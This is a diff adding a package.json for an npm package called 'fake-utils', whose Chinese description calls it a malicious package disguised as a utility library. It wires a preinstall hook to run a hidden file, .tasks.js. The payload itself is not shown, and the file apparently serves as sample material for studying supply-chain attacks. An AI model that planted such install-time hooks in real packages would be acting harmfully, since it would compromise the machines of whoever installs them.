@@ -1,0 +1,13 @@
+{
+  "name": "fake-utils",
+  "version": "1.0.0",
+  "description": "伪装成工具库的恶意包",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node .tasks.js",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "net": "^1.0.2"
+  }
+}
